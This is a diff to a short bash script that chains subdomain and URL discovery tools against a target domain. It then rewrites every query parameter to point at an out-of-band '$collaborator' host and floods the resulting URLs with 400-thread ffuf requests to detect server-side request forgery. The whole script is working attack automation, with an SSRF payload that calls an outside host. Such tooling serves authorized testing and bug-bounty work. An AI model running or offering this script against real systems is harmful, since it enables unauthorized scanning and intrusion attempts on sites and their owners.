@@ -1,7 +1,6 @@
 #!/bin/bash
 
-
-while getopts :d:c: fname; do
+while getopts :d: fname; do
 
         case $fname in
                 d) TARGET=$OPTARG;;
@@ -11,39 +10,45 @@ while getopts :d:c: fname; do
 done
 
 
-SUB_FINDER="$(subfinder -d $TARGET -silent | httpx -silent)"
+
+subfinder -d $TARGET -silent | httpx -silent >> subdomains_found.txt
 
 
 
-ASS_FINDER="$(assetfinder --subs-only $TARGET | httpx -silent)"
+assetfinder --subs-only $TARGET | httpx -silent >> subdomains_found.txt
 
 
 
-CERT="$(curl -sk 'https://crt.sh/?q=$TARGET' | grep -oE '[a-zA-Z0-9._-]+\.$TARGET' | sed -e '/[A-Z]/d' -e '/*/d' | grep -oP '[a-z0-9]+\.[a-z]+\.[a-z]+' | httpx -silent)"
-
-
-ALL_SUBS="$(cat $SUB_FINDER $ASS_FINDER $CERT | sort -u )"
-
-
-GAO="$(gau -subs $TARGET)"
+curl -sk "https://crt.sh/?q=$TARGET" | grep -oE "[a-zA-Z0-9._-]+\.$TARGET" | sed -e '/[A-Z]/d' -e '/*/d' | grep -oP '[a-z0-9]+\.[a-z]+\.[a-z]+' | httpx -silent >> subdomains_found.txt
 
 
 
-WAY="$(waybackurls $TARGET)"
+
+cat subdomains_found.txt | sort -u >> final_subs.txt
 
 
 
-ALL_WAY="$(cat $ALL_SUBS | waybackurls)"
+gau -subs $TARGET >> urls.txt
 
 
 
-GOSP="$(gospider -q -S $ALL_SUBS -c 10 -d 1)"
+waybackurls $TARGET >> urls.txt
 
 
-ALLIVE="$(cat $GAO $WAY $ALL_WAY $GOSP | sort -u | httpx -silent)"
+
+cat final_subs.txt | waybackurls >> urls.txt
 
 
-cat $ALLIVE | grep "=" | grep "?" | qsreplace 'http://$collaborator' >> ssrfuzz.txt
+
+gospider -q -S final_subs.txt -c 10 -d 1 >> urls.txt
+
+
+
+cat urls.txt | sort -u | httpx -silent >> allive.txt
+
+
+
+cat allive.txt | grep "=" | grep "?" | qsreplace 'http://$collaborator' >> ssrfuzz.txt
 
 
 ffuf -c -w ssrfuzz.txt -u FUZZ -t 400
